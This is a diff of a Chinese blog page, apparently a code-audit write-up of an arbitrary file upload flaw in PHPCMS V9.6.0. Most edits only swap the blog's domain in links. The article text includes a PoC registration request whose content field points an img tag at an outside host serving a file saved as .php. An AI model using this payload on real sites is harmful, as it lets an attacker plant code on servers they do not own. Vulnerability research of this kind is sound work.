@@ -21,7 +21,7 @@
   <meta name="description" content="PHPCMS_V9.6.0任意文件上传漏洞分析前言PHPCMS是一款网站管理软件。该软件采用模块化开发,支持多种分类方式。 环境搭建本次PHPCMS版本为9.6.0,安装步骤跟上一篇文章一样，参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现在注册用户处，添加用户进行抓包（这里以Tao为例）  123#pocsiteid&#x3D;1&amp;modelid&#x3D;11&amp;userna">
 <meta property="og:type" content="article">
 <meta property="og:title" content="代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析">
-<meta property="og:url" content="https://bobtaoy.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:url" content="https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Tao&#39;s Blog">
 <meta property="og:description" content="PHPCMS_V9.6.0任意文件上传漏洞分析前言PHPCMS是一款网站管理软件。该软件采用模块化开发,支持多种分类方式。 环境搭建本次PHPCMS版本为9.6.0,安装步骤跟上一篇文章一样，参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现在注册用户处，添加用户进行抓包（这里以Tao为例）  123#pocsiteid&#x3D;1&amp;modelid&#x3D;11&amp;userna">
 <meta property="og:locale" content="en_US">
@@ -76,7 +76,7 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203000959.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://bobtaoy.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+  <link rel="canonical" href="https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Tao&#39;s Blog" type="application/atom+xml">
   
@@ -354,7 +354,7 @@
     <div class="article-entry marked-body" itemprop="articleBody">
       
         <h1 id="PHPCMS-V9-6-0任意文件上传漏洞分析"><a href="#PHPCMS-V9-6-0任意文件上传漏洞分析" class="headerlink" title="PHPCMS_V9.6.0任意文件上传漏洞分析"></a>PHPCMS_V9.6.0任意文件上传漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHPCMS是一款网站管理软件。该软件采用模块化开发,支持多种分类方式。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次PHPCMS版本为<code>9.6.0</code>,安装步骤跟上一篇文章一样，参考<a href="https://bobtaoy.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS_V9.2任意文件上传getshell漏洞分析</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次PHPCMS版本为<code>9.6.0</code>,安装步骤跟上一篇文章一样，参考<a target="_blank" rel="noopener" href="https://bobtaoy.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS_V9.2任意文件上传getshell漏洞分析</a></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在注册用户处，添加用户进行抓包（这里以Tao为例）</p>
 <p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210313203000959.png" alt="image-20210313203000959"></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line">siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=Tao&amp;password=<span class="number">123456</span>&amp;email=Tao@qq.com&amp;info[<span class="type">content</span>]=&lt;img src=http://www.tao.com/t.txt?.php<span class="comment">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br><span class="line"><span class="comment"># http://www.tao.com/t.txt显示的内容为你要上传的文件内容</span></span><br></pre></td></tr></table></figure>
@@ -501,7 +501,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="https://bobtaoy.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析" target="_blank" rel="external"><font color="red">代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析</font></a>
+      <a href="https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析" target="_blank" rel="external"><font color="red">代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析</font></a>
     </li>
     
     <li class="post-copyright-license">
